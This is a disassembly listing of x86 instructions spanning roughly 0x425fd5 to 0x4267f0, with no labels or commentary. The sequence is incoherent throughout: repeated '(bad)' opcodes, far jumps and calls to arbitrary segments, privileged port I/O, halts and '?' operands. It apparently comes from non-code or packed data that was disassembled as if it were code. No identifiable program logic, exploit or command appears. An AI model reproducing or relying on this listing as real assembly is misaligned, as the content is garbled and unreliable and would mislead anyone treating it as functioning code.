  425fd5:	push   0xa3af8253
  425fda:	sbb    ah,BYTE PTR [edx-0x68f4893e]
  425fe0:	stos   DWORD PTR es:[edi],eax
  425fe1:	nop    DWORD PTR [esi+0x31502985]
  425fe8:	jecxz  0x426057
  425fea:	shl    BYTE PTR [esi],cl
  425fec:	pop    ebp
  425fed:	mov    DWORD PTR [edi-0x4e],0x39273858
  425ff4:	mov    al,ds:0x4421071a
  425ff9:	lds    ecx,FWORD PTR [eax+0x7c]
  425ffc:	fsubr  DWORD PTR [esp+ebp*2]
  425fff:	adc    ah,BYTE PTR [edi]
  426001:	mov    al,ds:0x9562451c
  426006:	aad    0xef
  426008:	xor    BYTE PTR [ebx+edi*2-0x35d48d9c],ch
  42600f:	push   eax
  426010:	lods   al,BYTE PTR ds:[esi]
  426011:	xlat   BYTE PTR ds:[ebx]
  426012:	loope  0x426079
  426014:	push   0xffffff9b
  426016:	daa    
  426017:	adc    bh,bl
  426019:	test   BYTE PTR [ecx-0x3e93dcb9],al
  42601f:	fldcw  WORD PTR ds:0x79e75e5c
  426025:	retf   
  426026:	pop    edx
  426027:	push   0xb3bf3696
  42602c:	jle    0x426062
  42602e:	(bad)  
  426030:	mov    gs,ecx
  426032:	jp     0x425fc9
  426034:	mov    eax,ds:0x9de37b10
  426039:	clc    
  42603a:	jp     0x425fda
  42603c:	dec    edx
  42603d:	xchg   edi,eax
  42603e:	jb     0x42600d
  426040:	je     0x426039
  426042:	cmp    bl,BYTE PTR [ebx+ecx*1+0x2e6275b]
  426049:	pop    eax
  42604a:	repnz jmp 0x9a12:0x416aa08c
  426052:	push   ss
  426053:	dec    esi
  426054:	xchg   ecx,eax
  426055:	aaa    
  426056:	adc    BYTE PTR [eax],al
  426058:	jg     0x426020
  42605a:	fs test al,0x3a
  42605d:	jnp    0x42603b
  42605f:	sbb    eax,0xf0fe2a7b
  426064:	lea    edi,[esi-0x31945dc7]
  42606a:	in     al,dx
  42606b:	pop    ecx
  42606c:	jo     0x426013
  42606e:	pop    DWORD PTR [edi-0x9]
  426071:	push   ebx
  426072:	call   0x62bd:0xf4f58b1b
  426079:	test   esp,ebx
  42607b:	(bad)  
  42607c:	enter  0x54a,0xe1
  426080:	test   eax,0xdeb5018
  426085:	push   edx
  426086:	rcr    DWORD PTR [eax],cl
  426088:	mov    cs,WORD PTR ds:0x3561d8f8
  42608e:	adc    BYTE PTR [eax+0x15badff0],dh
  426094:	jnp    0x4260a2
  426096:	aas    
  426097:	addr16 pushf 
  426099:	pop    ecx
  42609a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42609b:	sbb    esp,DWORD PTR [esi-0xa6de11c]
  4260a1:	icebp  
  4260a2:	inc    edi
  4260a3:	jno    0x4260b3
  4260a5:	sbb    DWORD PTR [edi+edx*8+0x68],0xd7011b68
  4260ad:	stos   BYTE PTR es:[edi],al
  4260ae:	add    eax,0x989c8f63
  4260b3:	jbe    0x426052
  4260b5:	(bad)
  4260b8:	fst    QWORD PTR [esi+0x3b]
  4260bb:	sbb    BYTE PTR ds:0xc556d3f6,ch
  4260c1:	xchg   ebp,eax
  4260c2:	mov    ds:0x627310a2,al
  4260c7:	fimul  DWORD PTR [eax-0x59]
  4260ca:	xor    eax,0x377013df
  4260cf:	pop    ds
  4260d0:	in     eax,dx
  4260d1:	rcr    DWORD PTR [ecx+0x53],cl
  4260d4:	or     ebx,0xffffffa1
  4260d7:	sbb    ebp,esp
  4260d9:	shr    BYTE PTR [eax-0x796a3618],cl
  4260df:	and    bl,BYTE PTR [edi-0x41]
  4260e2:	cs ss ret 0xd80
  4260e7:	jns    0x42607f
  4260e9:	mov    edi,0xb3c7ba11
  4260ee:	mov    edx,0x5cbfd676
  4260f3:	xchg   esp,eax
  4260f4:	dec    edx
  4260f5:	xlat   BYTE PTR ds:[ebx]
  4260f6:	and    eax,0x4f8c5515
  4260fb:	cld    
  4260fc:	scas   al,BYTE PTR es:[edi]
  4260fd:	jle    0x42614c
  4260ff:	fisubr WORD PTR [edx+0x47afef93]
  426105:	mov    bh,0x29
  426107:	mov    BYTE PTR [ebx-0x53446591],dh
  42610d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42610e:	out    dx,al
  42610f:	js     0x42617f
  426111:	rcr    DWORD PTR [ecx],0xf4
  426114:	cmp    bh,BYTE PTR [ebx]
  426116:	sbb    eax,0x1953fb02
  42611b:	jmp    0xf41d:0x421604e
  426122:	outs   dx,DWORD PTR ds:[esi]
  426123:	into   
  426124:	or     ah,al
  426126:	and    al,0xa0
  426128:	push   ecx
  426129:	data16 mov ah,0x5d
  42612c:	push   0x56
  42612e:	or     ebx,DWORD PTR [eax+0x5e1ab5ae]
  426134:	jo     0x42616c
  426136:	mov    dh,0x75
  426138:	je     0x426167
  42613a:	jg     0x42613d
  42613c:	jae    0x426106
  42613e:	gs jg  0x426156
  426141:	xchg   edi,eax
  426142:	jno    0x42613b
  426144:	jo     0x42619e
  426146:	fldcw  WORD PTR [edx]
  426148:	xor    ebp,esp
  42614a:	inc    eax
  42614b:	shl    dh,0x97
  42614e:	ret    
  42614f:	mov    al,0xcd
  426151:	shl    DWORD PTR [edi+0x76],0xd3
  426155:	jno    0x42612d
  426157:	sub    dl,bh
  426159:	mov    DWORD PTR ds:0x904b048b,esp
  42615f:	add    eax,0xe57ea47d
  426164:	mov    esp,0x9f0ff2a
  426169:	mov    esi,DWORD PTR [ecx]
  42616b:	(bad)  
  42616c:	mov    ch,0xaa
  42616e:	pushf  
  42616f:	hlt    
  426170:	jo     0x426139
  426172:	push   es
  426173:	sbb    edi,esp
  426175:	je     0x426147
  426177:	pop    esi
  426178:	icebp  
  426179:	jmp    0x17e6:0x12216ce5
  426180:	out    dx,al
  426181:	xchg   ebp,eax
  426182:	lahf   
  426183:	into   
  426184:	fs sbb al,0x2a
  426187:	daa    
  426188:	or     al,0xd4
  42618a:	loope  0x426181
  42618c:	and    eax,0x1246ead2
  426191:	add    ecx,DWORD PTR [ecx+0x19]
  426194:	out    0x8d,eax
  426196:	(bad)  [eax-0x78]
  426199:	call   0xc4ff4dec
  42619e:	je     0x4261d1
  4261a0:	jg     0x426197
  4261a2:	push   ds
  4261a3:	mov    cl,0x1f
  4261a5:	mov    esi,0x9b094eb2
  4261aa:	jle    0x42622a
  4261ac:	cmp    eax,0x5bbccbab
  4261b1:	cmp    BYTE PTR [edi+0x2f2e684b],ah
  4261b7:	pop    edx
  4261b8:	jge    0x42614d
  4261ba:	sbb    al,0xf9
  4261bc:	popf   
  4261bd:	bound  edi,QWORD PTR [edx-0x77450704]
  4261c3:	cmp    DWORD PTR ds:0xf51c4b0c,ebp
  4261c9:	dec    esp
  4261ca:	hlt    
  4261cb:	pop    es
  4261cc:	mov    dl,0x61
  4261ce:	sub    bl,BYTE PTR [esi-0x46]
  4261d1:	sbb    edx,DWORD PTR [ecx-0x487e21f8]
  4261d7:	cld    
  4261d8:	sub    ebp,DWORD PTR [eax+ebp*4]
  4261db:	je     0x42624f
  4261dd:	inc    ebp
  4261de:	shl    DWORD PTR [eax],1
  4261e0:	imul   DWORD PTR [eax+0x26]
  4261e3:	in     al,0xd1
  4261e5:	jge    0x4261e4
  4261e7:	add    al,0x64
  4261e9:	xchg   ebx,eax
  4261ea:	sub    esi,DWORD PTR [edi-0x7fe36899]
  4261f0:	hlt    
  4261f1:	xchg   BYTE PTR [ebp+0x42965abb],bl
  4261f7:	jne    0x4261dd
  4261f9:	clc    
  4261fa:	test   al,0xee
  4261fc:	fnsave [esi+0x55]
  4261ff:	xor    BYTE PTR [ebp+0x6a],ah
  426202:	push   cs
  426203:	xor    dl,BYTE PTR [ecx+ebx*8]
  426206:	sub    ecx,ecx
  426208:	stc    
  426209:	test   eax,0xb2836a2a
  42620e:	retf   0x59cb
  426211:	dec    ecx
  426212:	mov    BYTE PTR [esi+0x35],bh
  426215:	fwait
  426216:	jb     0x42619d
  426218:	or     eax,0x9e6a83a0
  42621d:	lods   eax,DWORD PTR ds:[esi]
  42621e:	mov    ds:0xc35be097,al
  426223:	fwait
  426224:	ins    BYTE PTR es:[edi],dx
  426225:	cmc    
  426226:	jle    0x4261b0
  426228:	scas   eax,DWORD PTR es:[edi]
  426229:	clc    
  42622a:	adc    eax,0x95987428
  42622f:	pop    esp
  426230:	or     al,0xf3
  426232:	ss xchg esi,eax
  426234:	outs   dx,DWORD PTR ds:[esi]
  426235:	hlt    
  426236:	pop    ebx
  426237:	ret    
  426238:	fiadd  WORD PTR [edx-0x5bffb583]
  42623e:	xor    esi,0xd7d736cf
  426244:	and    DWORD PTR [esi+0x4202896f],ebx
  42624a:	pop    es
  42624b:	add    eax,0x27c2d6b4
  426250:	jbe    0x426236
  426252:	cli    
  426253:	pop    esp
  426254:	or     esi,ecx
  426256:	call   0x2e54:0xc6a7d668
  42625d:	jne    0x4262c3
  42625f:	and    edi,DWORD PTR [edx-0x11676b69]
  426265:	pop    ss
  426266:	hlt    
  426267:	repz in eax,0x65
  42626a:	into   
  42626b:	cli    
  42626c:	cmp    esp,edi
  42626e:	stos   DWORD PTR es:[edi],eax
  42626f:	fwait
  426270:	in     eax,0x43
  426272:	sbb    dl,0x1e
  426275:	inc    DWORD PTR [ebx+eax*8]
  426278:	and    cl,dl
  42627a:	or     edx,DWORD PTR [ecx]
  42627c:	jno    0x426224
  42627e:	add    esi,DWORD PTR [ecx+0x28]
  426281:	aad    0xfc
  426283:	mov    ?,edi
  426285:	stc    
  426286:	or     DWORD PTR [edx],edx
  426288:	clc    
  426289:	push   esp
  42628a:	dec    ebp
  42628b:	dec    esi
  42628c:	xor    BYTE PTR [esp],dh
  42628f:	data16 ss mov bl,0x5f
  426293:	xchg   edx,eax
  426294:	adc    al,0xb0
  426296:	icebp  
  426297:	pop    esp
  426298:	scas   eax,DWORD PTR es:[edi]
  426299:	mov    dh,BYTE PTR ds:0xe1cd1aa3
  42629f:	and    DWORD PTR [esi+edi*4-0x62],esi
  4262a3:	bound  esi,QWORD PTR [eax-0x54]
  4262a6:	fwait
  4262a7:	lods   eax,DWORD PTR ds:[esi]
  4262a8:	jle    0x42629e
  4262aa:	mov    ebp,0x13634c8d
  4262af:	into   
  4262b0:	test   al,0xb1
  4262b2:	lock mov ebp,edi
  4262b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4262b6:	xchg   ecx,eax
  4262b7:	or     eax,0x58845aba
  4262bc:	sub    BYTE PTR [edi],al
  4262be:	mov    cl,0x16
  4262c0:	je     0x42627b
  4262c2:	ja     0x426262
  4262c4:	loop   0x4262cc
  4262c6:	enter  0x3347,0x66
  4262ca:	cmp    ebp,DWORD PTR [esi-0x2cf1e68f]
  4262d0:	jmp    0xce7b:0x1a438a5d
  4262d7:	retf   
  4262d8:	push   esp
  4262d9:	fisttp QWORD PTR [edx]
  4262db:	xchg   edi,eax
  4262dc:	dec    ebp
  4262dd:	aaa    
  4262de:	dec    edx
  4262df:	js     0x426357
  4262e1:	test   al,0xce
  4262e3:	cmovnp eax,DWORD PTR [ecx-0x4a]
  4262e7:	xchg   edi,eax
  4262e8:	jl     0x4262d3
  4262ea:	into   
  4262eb:	fist   DWORD PTR [edi+0x5e]
  4262ee:	scas   eax,DWORD PTR es:[edi]
  4262ef:	dec    ebx
  4262f0:	adc    BYTE PTR [edi-0x2d],0xc2
  4262f4:	stos   BYTE PTR es:[edi],al
  4262f5:	sub    edi,DWORD PTR ds:0x3c9c1001
  4262fb:	cmp    dl,bh
  4262fd:	in     al,0x11
  4262ff:	das    
  426300:	retf   
  426301:	xor    bh,BYTE PTR [esi-0x42]
  426304:	int    0xd9
  426306:	imul   ebp,ebp,0xcf90f3f1
  42630c:	jbe    0x426328
  42630e:	popf   
  42630f:	xchg   bl,ah
  426311:	pop    edi
  426312:	arpl   WORD PTR ds:0x22e72987,ax
  426318:	leave  
  426319:	mov    dh,0x9
  42631b:	lods   eax,DWORD PTR ds:[esi]
  42631c:	mov    ebp,0xf9365337
  426321:	adc    BYTE PTR [ebx-0x586c7744],bh
  426327:	sub    esp,DWORD PTR [ebp+0x62ebdaf1]
  42632d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42632e:	dec    eax
  42632f:	xlat   BYTE PTR ds:[ebx]
  426330:	and    cl,BYTE PTR [esi+0x3f]
  426333:	dec    esi
  426334:	mov    ?,esp
  426336:	mov    al,ds:0x173a11b9
  42633b:	push   cs
  42633c:	cdq    
  42633d:	es ret 0x7fbb
  426341:	aam    0xd
  426343:	or     dh,0x4b
  426346:	xor    eax,0x3096d045
  42634b:	and    al,0xe3
  42634d:	and    al,dl
  42634f:	mov    eax,ds:0x2590a4c6
  426354:	inc    ebp
  426355:	mov    edx,0x183e960a
  42635a:	loopne 0x4262ff
  42635c:	jnp    0x4262e2
  42635e:	nop
  42635f:	xlat   BYTE PTR ds:[ebx]
  426360:	xchg   ecx,eax
  426361:	loop   0x426330
  426363:	fld    QWORD PTR [edi-0x760d8939]
  426369:	push   ecx
  42636a:	jmp    0x10190e97
  42636f:	dec    edx
  426370:	and    dl,BYTE PTR [ebp+edx*4+0x2d505e0]
  426377:	mov    ds:0xca7811a0,eax
  42637c:	cmc    
  42637d:	(bad)  
  42637e:	or     dl,BYTE PTR [ebx+0x462017f7]
  426384:	mov    bl,0x28
  426386:	stc    
  426387:	(bad)  
  426388:	in     eax,dx
  426389:	loop   0x4263a6
  42638b:	je     0x426369
  42638d:	mov    ah,0x30
  42638f:	pop    edi
  426390:	shl    BYTE PTR [eax],0x65
  426393:	adc    al,0xca
  426395:	cdq    
  426396:	push   esp
  426397:	sub    al,0xd0
  426399:	adc    al,0xc3
  42639b:	mov    ah,0x1d
  42639d:	loopne 0x426325
  42639f:	scas   eax,DWORD PTR es:[edi]
  4263a0:	out    0xf7,al
  4263a2:	xchg   edi,eax
  4263a3:	mov    ebp,0xa10bb33e
  4263a8:	mov    al,gs:0xdc167436
  4263ae:	xor    eax,0xaead7dc8
  4263b3:	mov    cl,0xb5
  4263b5:	cmp    al,0xde
  4263b7:	pop    ss
  4263b8:	and    al,bl
  4263ba:	addr16 pop es
  4263bc:	push   0x1ca04409
  4263c1:	cmp    eax,0xfafe5373
  4263c6:	div    BYTE PTR [esp+ebp*1-0x255d9f28]
  4263cd:	push   cs
  4263ce:	dec    edx
  4263cf:	mov    edi,0x73ef7a0e
  4263d4:	inc    bh
  4263d6:	cmc    
  4263d7:	jl     0x4263ee
  4263d9:	outs   dx,DWORD PTR ds:[esi]
  4263da:	xchg   DWORD PTR [esi+edi*8],edi
  4263dd:	mov    edi,0xbac750c7
  4263e2:	cmc    
  4263e3:	mov    bl,ch
  4263e5:	pop    ecx
  4263e6:	xlat   BYTE PTR ds:[ebx]
  4263e7:	xor    BYTE PTR [edx+eiz*8+0x31],0xc1
  4263ec:	adc    al,dh
  4263ee:	outs   dx,DWORD PTR ds:[esi]
  4263ef:	push   esp
  4263f0:	inc    esi
  4263f1:	leave  
  4263f2:	jns    0x426386
  4263f4:	cli    
  4263f5:	or     ecx,DWORD PTR [eax+0x1d88a97]
  4263fb:	(bad)  
  4263fc:	sti    
  4263fd:	aad    0x67
  4263ff:	call   0x110675f
  426404:	outs   dx,BYTE PTR ds:[esi]
  426405:	inc    eax
  426406:	pop    ss
  426407:	push   ebx
  426408:	aas    
  426409:	adc    al,0xce
  42640b:	ins    BYTE PTR es:[edi],dx
  42640c:	pop    esp
  42640d:	outs   dx,BYTE PTR ds:[esi]
  42640e:	cmp    ebp,eax
  426410:	pop    ds
  426411:	fmul   QWORD PTR [ecx]
  426413:	cmp    eax,0x7f2eb00d
  426418:	sub    ebx,DWORD PTR [eax-0x63480c4d]
  42641e:	mov    al,ds:0xee5b6cdd
  426423:	loope  0x42642f
  426425:	jp     0x426481
  426427:	sub    al,bl
  426429:	ins    DWORD PTR es:[edi],dx
  42642a:	sub    cl,dl
  42642c:	xor    esp,eax
  42642e:	jae    0x42648c
  426430:	std    
  426431:	repz add BYTE PTR [esp+eax*8+0x1d41f2a],dh
  426439:	mov    esi,0x78814a7f
  42643e:	cmp    esi,esp
  426440:	icebp  
  426441:	retf   
  426442:	xchg   esi,eax
  426443:	jecxz  0x4264a2
  426445:	or     ebx,0x5e3c3d83
  42644b:	mov    ds:0x33db0a0f,al
  426450:	aaa    
  426451:	mov    eax,0x67c8bfa7
  426456:	inc    edx
  426457:	rcl    ebx,0xd1
  42645a:	loopne 0x426486
  42645c:	sbb    al,0x40
  42645e:	shr    DWORD PTR [ecx+0x59d9071a],1
  426464:	sub    cl,bl
  426466:	cmp    al,0xd
  426468:	and    bh,BYTE PTR [ebx-0x3dbde3c5]
  42646e:	sbb    DWORD PTR [edi+0x3432a7f7],0xd146d28b
  426478:	ja     0x426477
  42647a:	mov    ebp,ds
  42647c:	mov    edx,ebx
  42647e:	fwait
  42647f:	lds    ebp,FWORD PTR [edi+ecx*1-0x5d54e740]
  426486:	cli    
  426487:	mov    bh,0xe5
  426489:	jae    0x426429
  42648b:	(bad)  
  42648c:	enter  0x18c7,0xfc
  426490:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426491:	rcl    esp,1
  426493:	retf   
  426494:	mov    DWORD PTR [eax],eax
	...
  4264aa:	inc    edx
  4264ab:	inc    esp
  4264ac:	inc    ebp
  4264ad:	pop    eax
  4264ae:	inc    edi
  4264af:	pop    ecx
  4264b0:	pop    edi
  4264b1:	pop    esi
  4264b2:	mov    bl,0x51
  4264b4:	push   eax
  4264b5:	mov    cl,0xb8
  4264b7:	and    eax,0xf1539c7d
  4264bc:	add    DWORD PTR [eax],eax
  4264be:	rol    DWORD PTR [esi],cl
  4264c0:	add    BYTE PTR [eax],al
  4264c2:	pop    ss
  4264c3:	ret    
  4264c4:	cwde   
  4264c5:	inc    edx
  4264c6:	push   edi
  4264c7:	mov    edx,0xf42dc5a1
  4264cc:	ret    0xa300
  4264cf:	inc    esi
  4264d0:	inc    esi
  4264d1:	adc    DWORD PTR [esp+edi*2-0x36495f38],esp
  4264d8:	pop    ecx
  4264d9:	mov    cl,0x93
  4264db:	jmp    0x3c7b:0xc3024a36
  4264e2:	fcom   DWORD PTR [edx-0x4]
  4264e5:	mov    edi,0x1346e718
  4264ea:	or     dl,dh
  4264ec:	xchg   ecx,eax
  4264ed:	xlat   BYTE PTR ds:[ebx]
  4264ee:	cli    
  4264ef:	mov    dh,0x62
  4264f1:	inc    edx
  4264f2:	cwde   
  4264f3:	pop    edx
  4264f4:	lods   al,BYTE PTR ds:[esi]
  4264f5:	fldcw  WORD PTR [ebp-0x17]
  4264f8:	mov    dh,0x26
  4264fa:	sbb    al,0xad
  4264fc:	sub    bl,BYTE PTR ds:0x27d43c03
  426502:	adc    BYTE PTR [ecx-0x2bd9a7eb],0xad
  426509:	retf   
  42650a:	or     eax,0x244eb7fb
  42650f:	ficomp DWORD PTR [edx+0x1d]
  426512:	sub    BYTE PTR [bp+di-0x5d84],cl
  426517:	mov    DWORD PTR [edx-0x58],eax
  42651a:	js     0x42653f
  42651c:	mov    dh,0xaf
  42651e:	int    0x6a
  426520:	mov    al,0x73
  426522:	push   eax
  426523:	sub    al,0x6e
  426525:	ds daa 
  426527:	fild   DWORD PTR ds:0x67351518
  42652d:	xor    BYTE PTR [edx+eiz*8],ch
  426530:	and    dh,cl
  426532:	mov    bh,0xcd
  426534:	xor    BYTE PTR [ebp-0x448a837],0x6e
  42653b:	cmp    eax,0x47f1daec
  426540:	cmp    al,0x37
  426542:	retf   
  426543:	xchg   ecx,eax
  426544:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426545:	mov    ebp,0x560bf10f
  42654a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42654b:	mov    ds:0x28cb3378,al
  426550:	push   esp
  426551:	dec    ebx
  426552:	js     0x4264d8
  426554:	jno    0x426524
  426556:	mul    dh
  426558:	sbb    DWORD PTR [edi+ebp*2-0x221a179d],ecx
  42655f:	rcr    DWORD PTR [ecx+0x5b],1
  426562:	jp     0x4264f4
  426564:	push   ecx
  426565:	ja     0x42652a
  426567:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426568:	cld    
  426569:	cld    
  42656a:	adc    bl,cl
  42656c:	dec    edx
  42656d:	and    DWORD PTR [esi-0x70],ebp
  426570:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426571:	out    dx,al
  426572:	pop    ds
  426573:	clc    
  426574:	rcr    DWORD PTR [eax-0x1cd12166],0x8a
  42657b:	arpl   bp,si
  42657d:	pop    ds
  42657e:	mov    esp,0x87ab1f30
  426583:	test   dh,ah
  426585:	sbb    BYTE PTR [edx+0x7c37a388],ah
  42658b:	js     0x42660b
  42658d:	mov    edx,0xe40ab0dd
  426592:	imul   edx,DWORD PTR [eax],0x3f6c389f
  426598:	call   0xbee0:0x2f08e74e
  42659f:	daa    
  4265a0:	gs pop es
  4265a2:	pusha  
  4265a3:	(bad)  
  4265a4:	push   eax
  4265a5:	dec    esi
  4265a6:	fisub  DWORD PTR [edx]
  4265a8:	stos   BYTE PTR es:[edi],al
  4265a9:	add    DWORD PTR [edi],eax
  4265ab:	aas    
  4265ac:	ret    0xddb2
  4265af:	in     al,0x87
  4265b1:	repz adc eax,esi
  4265b4:	or     BYTE PTR [esi-0x52],ah
  4265b7:	out    0x51,eax
  4265b9:	sbb    bh,BYTE PTR [ebx-0x6a]
  4265bc:	test   DWORD PTR [eax],0x4497180f
  4265c2:	inc    eax
  4265c3:	in     eax,0x5
  4265c5:	jmp    0x34da9da1
  4265ca:	pop    edi
  4265cb:	jp     0x426592
  4265cd:	jns    0x4265da
  4265cf:	(bad)  
  4265d0:	repz cli 
  4265d2:	jg     0x42660e
  4265d4:	push   ss
  4265d5:	sbb    esi,ebx
  4265d7:	ror    DWORD PTR [esi-0x28],1
  4265da:	xor    al,0x5e
  4265dc:	retf   0xddc6
  4265df:	(bad)  
  4265e0:	xor    BYTE PTR [ebx+0xc],ch
  4265e3:	pop    edx
  4265e4:	and    DWORD PTR [edi-0x15bd26d8],eax
  4265ea:	push   cs
  4265eb:	ret    0xde04
  4265ee:	pop    ebx
  4265ef:	mov    WORD PTR [eax],gs
  4265f1:	ins    BYTE PTR es:[edi],dx
  4265f2:	lods   al,BYTE PTR ds:[esi]
  4265f3:	lea    edi,[ecx-0x4a]
  4265f6:	dec    eax
  4265f7:	jno    0x42657d
  4265f9:	push   edi
  4265fa:	out    0x82,al
  4265fc:	mov    dh,0xaa
  4265fe:	pusha  
  4265ff:	jle    0x4265f0
  426601:	fs xchg esp,eax
  426603:	fst    st(7)
  426605:	pop    edi
  426606:	jge    0x4265f2
  426608:	scas   eax,DWORD PTR es:[edi]
  426609:	cmp    edi,0xc7b240ab
  42660f:	cmp    bh,BYTE PTR ds:0xd9fed519
  426615:	xor    al,0x90
  426617:	jo     0x426684
  426619:	or     bh,0x7a
  42661c:	pushf  
  42661d:	push   edx
  42661e:	mov    ebx,0xf2851da7
  426623:	test   BYTE PTR [esp+edi*2+0x34f51eb9],cl
  42662a:	and    DWORD PTR [edx+0x28],ebp
  42662d:	mov    bl,bl
  42662f:	pop    esi
  426630:	loop   0x426671
  426632:	das    
  426633:	imul   edi,DWORD PTR [eax+0x47],0x28d9c69d
  42663a:	repnz fild WORD PTR [ebx+0x20ea906e]
  426641:	leave  
  426642:	addr16 pop esi
  426644:	mov    ecx,0x9ba4cab1
  426649:	pushf  
  42664a:	jl     0x42666a
  42664c:	ror    BYTE PTR [ebx-0x20fd9a5d],0x4c
  426653:	jb     0x42661c
  426655:	pop    edx
  426656:	(bad)  
  426657:	inc    esp
  426658:	dec    eax
  426659:	cmp    dl,al
  42665b:	hlt    
  42665c:	jnp    0x4266d5
  42665e:	jecxz  0x42666b
  426660:	fs dec esi
  426662:	adc    DWORD PTR [edi+0x2f22e02f],eax
  426668:	cmc    
  426669:	je     0x426642
  42666b:	jnp    0x426647
  42666d:	(bad)  
  42666e:	push   cs
  42666f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426670:	mov    eax,0x6829026f
  426675:	aad    0xbf
  426677:	je     0x4266dc
  426679:	stos   BYTE PTR es:[edi],al
  42667a:	mov    ds:0xebbc4d19,eax
  42667f:	ror    BYTE PTR [ebp-0x78],1
  426682:	push   0x15
  426684:	fld    st(6)
  426686:	jp     0x4266c4
  426688:	fsubr  DWORD PTR [esi-0x5a]
  42668b:	xchg   esi,eax
  42668c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42668d:	and    dl,BYTE PTR [ecx]
  42668f:	or     DWORD PTR [ebp+edx*4-0x65128f18],0xecdbfeb4
  42669a:	lods   eax,DWORD PTR ds:[esi]
  42669b:	cmc    
  42669c:	loop   0x4266e4
  42669e:	shl    DWORD PTR [edx],cl
  4266a0:	cmp    DWORD PTR [eax+esi*8],eax
  4266a3:	xor    ebp,edx
  4266a5:	mov    ah,0xb9
  4266a7:	ins    DWORD PTR es:[edi],dx
  4266a8:	ja     0x426636
  4266aa:	nop
  4266ab:	out    0x9b,eax
  4266ad:	jecxz  0x426636
  4266af:	dec    esp
  4266b0:	cmc    
  4266b1:	inc    eax
  4266b2:	fwait
  4266b3:	push   ebx
  4266b4:	add    DWORD PTR [ecx+0xc903a5c],ebp
  4266ba:	xchg   DWORD PTR [edx+eiz*1+0x67],ebp
  4266be:	dec    ebp
  4266bf:	mov    eax,DWORD PTR [edi+ebx*4+0x6b3d01f3]
  4266c6:	outs   dx,BYTE PTR ds:[esi]
  4266c7:	push   edx
  4266c8:	jmp    0xce8e:0xf6aa4652
  4266cf:	popf   
  4266d0:	pop    edi
  4266d1:	addr16 (bad) 
  4266d3:	cmp    eax,0x60ecc604
  4266d8:	push   ss
  4266d9:	xor    BYTE PTR [edx-0x699187dc],dl
  4266df:	sbb    eax,0xe01d701e
  4266e5:	test   BYTE PTR [edi+0x55d4d4e2],0x76
  4266ec:	push   edx
  4266ed:	mov    eax,0x3194a7ab
  4266f2:	jg     0x42668b
  4266f4:	shr    DWORD PTR [esi+0x53e65925],0xe
  4266fb:	or     dl,BYTE PTR [esi+0xe]
  4266fe:	fidiv  WORD PTR [esi+0x77055ac3]
  426704:	mov    BYTE PTR es:[edx],bl
  426707:	xchg   ecx,eax
  426708:	int3   
  426709:	xchg   edi,eax
  42670a:	jge    0x4266de
  42670c:	lods   al,BYTE PTR ds:[esi]
  42670d:	xchg   esi,eax
  42670e:	mov    ds:0x9c49d729,eax
  426713:	add    eax,DWORD PTR [ebp+0x1166c365]
  426719:	mov    es,WORD PTR ss:[esi-0x11]
  42671d:	add    BYTE PTR [ebx-0x75],dl
  426720:	out    0x60,al
  426722:	ror    DWORD PTR [ebx+0x3d5c41be],cl
  426728:	leave  
  426729:	rol    BYTE PTR ds:0x3d7dac9,1
  42672f:	fld    TBYTE PTR [esi+0x3b]
  426732:	je     0x426721
  426734:	jns    0x4266e4
  426736:	sbb    ecx,DWORD PTR [edi]
  426738:	mov    edi,0x70d395c
  42673d:	mov    dl,0x8
  42673f:	shl    BYTE PTR [esi+0x16],cl
  426742:	stos   BYTE PTR es:[edi],al
  426743:	dec    esp
  426744:	sbb    edx,DWORD PTR [edi-0x5d559ad3]
  42674a:	bound  edi,QWORD PTR [edx]
  42674c:	sbb    eax,0x24543c21
  426751:	nop
  426752:	les    esp,FWORD PTR [ebp+edx*2-0x28c26774]
  426759:	hlt    
  42675a:	mov    esi,0xc199fcdc
  42675f:	ret    
  426760:	ror    DWORD PTR [edi-0x602618a8],0xe3
  426767:	inc    ecx
  426768:	pop    edx
  426769:	fdiv   QWORD PTR [edi+0x5b0c88b2]
  42676f:	mov    DWORD PTR [ecx],edi
  426771:	mov    ah,BYTE PTR [edi+edi*8]
  426774:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426775:	xor    edi,DWORD PTR [edx-0x67]
  426778:	or     edx,DWORD PTR [esi-0x72]
  42677b:	retf   
  42677c:	inc    ebp
  42677d:	or     edi,DWORD PTR [ecx+0x1476f813]
  426783:	pop    ebx
  426784:	ror    al,0x1e
  426787:	push   ss
  426788:	ds in  al,dx
  42678a:	cmc    
  42678b:	fcom   st(6)
  42678d:	inc    esi
  42678e:	into   
  42678f:	xor    dh,BYTE PTR [edx]
  426791:	xchg   BYTE PTR [ebx-0x6a18ce21],al
  426797:	mov    ebp,0xc1dec639
  42679c:	loope  0x426767
  42679e:	cld    
  42679f:	and    ch,BYTE PTR [esi+0x25]
  4267a2:	cmp    eax,0x5b749643
  4267a7:	call   0xd88d6938
  4267ac:	jmp    0x42675c
  4267ae:	adc    dl,ch
  4267b0:	add    bl,BYTE PTR [ecx-0x3f459462]
  4267b6:	xchg   ebx,ebx
  4267b8:	clc    
  4267b9:	fnsave [eax+0x7e]
  4267bc:	outs   dx,BYTE PTR ds:[esi]
  4267bd:	jl     0x4267da
  4267bf:	xor    eax,0x9cc51adc
  4267c4:	and    edx,DWORD PTR ds:0x321878b3
  4267ca:	add    eax,0x7ee91f36
  4267cf:	fistp  DWORD PTR [ebx-0x71]
  4267d2:	jae    0x426772
  4267d4:	ins    DWORD PTR es:[edi],dx
  4267d5:	mov    eax,DWORD PTR [edi]
  4267d7:	neg    DWORD PTR [esi]
  4267d9:	je     0x426769
  4267db:	cmp    ch,BYTE PTR [edx]
  4267dd:	cdq    
  4267de:	sbb    esi,DWORD PTR [edx-0x38]
  4267e1:	dec    edx
  4267e2:	xor    DWORD PTR [edi+0x33b19cf6],esp
  4267e8:	lahf   
  4267e9:	or     DWORD PTR [edx+edi*2+0x3408cfc7],ebx
  4267f0:	fisubr DWORD PTR [edi-0x37]
